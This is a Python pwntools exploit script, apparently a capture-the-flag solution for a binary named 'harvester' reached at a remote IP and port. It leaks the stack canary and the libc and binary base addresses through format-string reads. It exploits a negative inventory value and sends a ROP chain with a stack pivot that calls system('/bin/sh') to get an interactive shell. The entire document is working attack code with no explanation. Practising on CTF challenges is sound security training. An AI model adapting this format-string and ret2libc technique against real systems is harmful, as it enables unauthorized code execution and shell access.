from pwn import *

exe = './harvester'
context.binary = exe

    # Arch:     amd64-64-little
    # RELRO:    Full RELRO
    # Stack:    Canary found
    # NX:       NX enabled
    # PIE:      PIE enabled


# p = process(exe)
# libc = ELF('./libc.self')
# START_MAIN_RET_OFFSET = 0x26d0a
# POP_RDX_OFFSET = 0x00000000000cb1cd


p = remote('188.166.172.13', 32049)
libc = ELF('./libc.so.6', checksec=False)
START_MAIN_RET_OFFSET = 0x021bf7
POP_RDX_OFFSET = 0x0000000000001b96

elf = ELF(exe, checksec=False)

def leak_format(index):
    p.recvuntil('>')
    p.sendline('1') #fight
    p.recvuntil('>')
    p.sendline(f"%{index}$p")
    p.recvuntil('\n')
    result = p.recvuntil('\n')
    data = result.split(b'choice is: ')[1]
    if index >= 10: data = data.split(b'\x1b')[0]
    else: data = data.split(b'\n')[0]
    return data

def leak_format_int(index):
    leak = leak_format(index)
    if leak == b'(nil)': return 0
    else: return int(leak.decode('latin-1'), 16)


canary = leak_format_int(11)
log.info(f"canary = {hex(canary)}")
MAIN_RET = leak_format_int(13)
libc_leak = leak_format_int(3)
stack_address = leak_format_int(12)
log.info(f"Stack address {hex(stack_address)}")

libc_start_main_ret = leak_format_int(21)
libc.address = libc_start_main_ret - START_MAIN_RET_OFFSET

log.info(f"Libc base @ {hex(libc.address)}")

elf.address = MAIN_RET - 0xeca
log.info(f"Binary base @ {hex(elf.address)}")

def inventory_drop():
    # drop -11 pies
    p.recvuntil('>')
    p.sendline('2')  # inventory
    p.recvuntil('>')
    p.sendline('y')
    p.recvuntil('>')
    p.sendline('-11')
    log.info('Inventory: dropped -11 pies')


POP_RDI = elf.address + 0x0000000000001063
LEAVE_RET = elf.address + 0x0000000000000a57
BIN_SH = next(libc.search(b'/bin/sh\x00'))
POP_RSI_R15 = elf.address + 0x0000000000001061
POP_RSI = next(libc.search(asm('pop rsi \n ret')))
POP_RDX = libc.address + POP_RDX_OFFSET

PCT_S = next(libc.search(b'%s\x00'))

STACK_PIVOT_OFFSET = 80

def send_payload():
    # stare and exploit
    #canary at offset 40
    # # need a stack pivot!
    # stack_pivot_addr = stack_address - (STACK_PIVOT_OFFSET - (3 * 8)) # +2  -3!
    stack_pivot_addr = stack_address - STACK_PIVOT_OFFSET - 8
    
    payload = flat({
        # 0: stack_address,
        0: POP_RDI,
        8: BIN_SH,
        # 16: stack_pivot_addr,
        16: libc.sym['system'],
        24: elf.sym['main'],
        
        40: canary,
        48: stack_pivot_addr,
        56: LEAVE_RET
    })



    p.recvuntil('>')
    p.sendline('3')  # fight
    p.recvuntil('>')

    p.clean()
    p.send(payload)



inventory_drop()
send_payload()


p.interactive()
